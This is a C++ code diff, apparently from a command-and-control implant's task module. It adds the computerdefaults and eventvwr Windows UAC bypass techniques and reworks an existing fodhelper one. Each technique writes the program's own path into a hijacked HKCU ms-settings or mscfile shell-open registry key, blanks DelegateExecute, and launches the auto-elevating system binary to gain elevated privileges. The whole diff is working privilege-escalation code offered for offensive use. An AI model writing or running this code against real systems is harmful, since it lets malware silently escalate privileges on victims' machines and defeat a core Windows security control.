@@ -11,61 +11,140 @@ namespace Task
         {
             return L"Error: Failed to get the program path.";
         }
-
         LPCWSTR lpSelfPath = wSelfPath;
 
-        if (wcscmp(wTechnique.c_str(), L"fodhelper") == 0)
-        {
-            // Reference: https://cocomelonc.github.io/malware/2023/06/19/malware-av-evasion-17.html
-            HKEY hKey;
-            DWORD d;
-            std::wstring wSubKey = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
-            std::wstring wCmd = L"cmd /c start " + std::wstring(wSelfPath);
-            LPCWSTR lpCmd = wCmd.c_str();
-            const WCHAR* wDel = L"";
+        HKEY hKey;
+        DWORD d;
 
-            if (pState->pProcs->lpRegCreateKeyExW(
+        if (wcscmp(wTechnique.c_str(), L"computerdefaults") == 0)
+        {
+            // Reference: https://github.com/blue0x1/uac-bypass-oneliners
+            std::wstring wSubKey = L"SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command";
+
+            // reg add "HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\Command" /ve /t REG_SZ /d "cmd /c start ..."
+            std::wstring wCmd = std::wstring(wSelfPath);
+            LPCWSTR lpCmd = wCmd.c_str();
+            if (!System::Registry::RegAdd(
+                pState->pProcs,
                 HKEY_CURRENT_USER,
                 wSubKey.c_str(),
-                0,
-                nullptr,
-                0,
-                KEY_WRITE,
-                nullptr,
-                &hKey,
-                &d
-            ) != ERROR_SUCCESS)
-            {
-                return L"Error: Failed to create key: Image File Execution Options\\notepad.exe.";
-            }
-
-            if (pState->pProcs->lpRegSetValueExW(
-                hKey,
                 L"",
-                0,
                 REG_SZ,
                 (BYTE*)lpCmd,
                 (wcslen(lpCmd) + 1) * sizeof(WCHAR)
-            ) != ERROR_SUCCESS)
-            {
-                pState->pProcs->lpRegCloseKey(hKey);
-                return L"Error: Failed to set default value for ms-settings command.";
+            )) {
+                return L"Error: Failed to add registry value for HKCU\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command.";
             }
 
-            if (pState->pProcs->lpRegSetValueExW(
-                hKey,
+            // reg add "HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\Command" /v DelegateExecute /t REG_SZ /d ""
+            const WCHAR* wDel = L"";
+            if (!System::Registry::RegAdd(
+                pState->pProcs,
+                HKEY_CURRENT_USER,
+                wSubKey.c_str(),
                 L"DelegateExecute",
-                0,
                 REG_SZ,
                 (BYTE*)wDel,
                 (wcslen(wDel) + 1) * sizeof(WCHAR)
-            ) != ERROR_SUCCESS)
-            {
-                pState->pProcs->lpRegCloseKey(hKey);
-                return L"Error: Failed to set 'DelegateExecute' value for ms-settings command.";
+            )) {
+                return L"Error: Failed to add registry value for DeletegateExecute.";
             }
 
-            pState->pProcs->lpRegCloseKey(hKey);
+            // Start the fodhelper.exe
+            SHELLEXECUTEINFO sei = {sizeof(sei)};
+            sei.lpVerb = L"runas";
+            sei.lpFile = L"C:\\Windows\\System32\\computerdefaults.exe";
+            sei.hwnd = nullptr;
+            sei.nShow = SW_NORMAL;
+
+            if (!pState->pProcs->lpShellExecuteExW(&sei))
+            {
+                return L"Error: Failed to execute computerdefaults.exe.";
+            }
+
+            return L"Success: The computerdefaults and another process started successfully.";
+        }
+        else if (wcscmp(wTechnique.c_str(), L"eventvwr") == 0)
+        {
+            // Reference: https://github.com/blue0x1/uac-bypass-oneliners
+            std::wstring wSubKey = L"SOFTWARE\\Classes\\mscfile\\Shell\\Open\\Command";
+
+            // reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "cmd /c start ..."
+            std::wstring wCmd = std::wstring(wSelfPath);
+            LPCWSTR lpCmd = wCmd.c_str();
+            if (!System::Registry::RegAdd(
+                pState->pProcs,
+                HKEY_CURRENT_USER,
+                wSubKey.c_str(),
+                L"",
+                REG_SZ,
+                (BYTE*)lpCmd,
+                (wcslen(lpCmd) + 1) * sizeof(WCHAR)
+            )) {
+                return L"Error: Failed to add registry value for HKCU\\SOFTWARE\\Classes\\mscfile\\Shell\\Open\\Command.";
+            }
+
+            // reg add "HKCU\Software\Classes\mscfile\shell\open\command" /v DelegateExecute /t REG_SZ /d ""
+            const WCHAR* wDel = L"";
+            if (!System::Registry::RegAdd(
+                pState->pProcs,
+                HKEY_CURRENT_USER,
+                wSubKey.c_str(),
+                L"DelegateExecute",
+                REG_SZ,
+                (BYTE*)wDel,
+                (wcslen(wDel) + 1) * sizeof(WCHAR)
+            )) {
+                return L"Error: Failed to add registry value for DelegateExecute";
+            }
+
+            // Start the eventvwr.exe
+            SHELLEXECUTEINFO sei = {sizeof(sei)};
+            sei.lpVerb = L"runas";
+            sei.lpFile = L"C:\\Windows\\System32\\eventvwr.exe";
+            sei.hwnd = nullptr;
+            sei.nShow = SW_NORMAL;
+
+            if (!pState->pProcs->lpShellExecuteExW(&sei))
+            {
+                return L"Error: Failed to execute eventvwr.exe.";
+            }
+
+            return L"Success: The eventvwr and another process started successfully.";
+        }
+        else if (wcscmp(wTechnique.c_str(), L"fodhelper") == 0)
+        {
+            // Reference: https://cocomelonc.github.io/malware/2023/06/19/malware-av-evasion-17.html
+            std::wstring wSubKey = L"SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command";
+
+            // reg add "HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\Command" /ve /t REG_SZ /d "cmd /c start ..."
+            std::wstring wCmd = std::wstring(wSelfPath);
+            LPCWSTR lpCmd = wCmd.c_str();
+            if (!System::Registry::RegAdd(
+                pState->pProcs,
+                HKEY_CURRENT_USER,
+                wSubKey.c_str(),
+                L"",
+                REG_SZ,
+                (BYTE*)lpCmd,
+                (wcslen(lpCmd) + 1) * sizeof(WCHAR)
+            )) {
+                return L"Error: Failed to add registry value for HKCU\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command.";
+            }
+
+            // reg add "HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\Command" /v DelegateExecute /t REG_SZ /d ""
+            const WCHAR* wDel = L"";
+            if (!System::Registry::RegAdd(
+                pState->pProcs,
+                HKEY_CURRENT_USER,
+                wSubKey.c_str(),
+                L"DelegateExecute",
+                REG_SZ,
+                (BYTE*)wDel,
+                (wcslen(wDel) + 1) * sizeof(WCHAR)
+            )) {
+                return L"Error: Failed to add registry value for DeletegateExecute.";
+            }
 
             // Start the fodhelper.exe
             SHELLEXECUTEINFO sei = {sizeof(sei)};
@@ -76,10 +155,10 @@ namespace Task
 
             if (!pState->pProcs->lpShellExecuteExW(&sei))
             {
-                return L"Error: Failed to execute shell.";
+                return L"Error: Failed to execute fodhelper.exe.";
             }
 
-            return L"Success: The fodhelper.exe and another process started successfully.";
+            return L"Success: The fodhelper and another process started successfully.";
         }
 
         return L"Error: Invalid technique.";
